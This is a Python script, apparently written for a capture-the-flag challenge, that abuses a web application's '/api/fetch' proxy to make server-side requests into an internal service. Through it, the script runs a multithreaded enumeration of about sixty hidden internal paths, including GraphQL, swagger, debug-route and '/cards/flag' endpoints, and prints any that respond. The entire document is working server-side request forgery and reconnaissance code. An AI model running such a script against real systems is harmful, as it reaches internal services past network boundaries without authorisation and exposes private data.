import urllib.request, urllib.error, json, concurrent.futures
BASE='https://<host>/fireburned-2'
STORE='http://fireburned--db:8080'
def fetch(path, method='GET', body=None):
    obj={'url':STORE+path}
    if method!='GET': obj['method']=method
    if body is not None: obj['body']=body
    data=json.dumps(obj).encode()
    r=urllib.request.Request(BASE+'/api/fetch',data=data,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'},method='POST')
    try:
        resp=urllib.request.urlopen(r,timeout=15); b=resp.read(); j=json.loads(b)
        return (j.get('upstream_status'), j.get('body'))
    except urllib.error.HTTPError as e:
        return ('HTTP'+str(e.code), e.read()[:300].decode('latin1','replace'))
    except Exception as e:
        return ('ERR',str(e)[:120])
tests=[]
paths=['/','/cards/','/card/','/drafts/','/draft/','/documents/','/document/','/hooks/','/hook/','/webhooks/','/webhook/','/templates/','/template/','/previews/','/preview/','/notifications/','/notification/','/items/','/item/','/data/','/store/','/api/','/api/v1/','/v1/','/v2/','/graphql','/graphiql','/api/graphql','/query','/rpc','/jsonrpc','/rest','/swagger','/swagger.json','/openapi.json','/routes','/__routes__','/debug/routes','/cards.json','/cards?all=1','/cards?limit=100','/cards?list=1','/card?id=1','/get?id=1','/fetch?id=1','/?card=1','/?id=1','/cards/default','/cards/welcome','/cards/1.json','/cards/flag','/hooks/1','/hooks/default','/hooks/welcome','/webhook/1','/webhook/default','/preview/1','/preview/default','/drafts/1','/draft/1','/documents/1','/document/1']
for p in paths:
    tests.append((p,'GET',None))
for p in ['/graphql','/graphiql','/api/graphql','/query','/rpc','/jsonrpc','/rest','/api','/api/v1','/cards','/hooks','/webhooks','/preview','/drafts','/documents','/']:
    tests.append((p,'POST','{}'))
    tests.append((p,'POST','{"query":"{__typename}"}'))
def run(t):
    p,m,b=t
    st,body=fetch(p,m,b)
    return (p,m,st,body)
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    for p,m,st,body in ex.map(run,tests):
        if st not in (404,):
            print('HIT',m,p,st,str(body)[:300])
print('done')
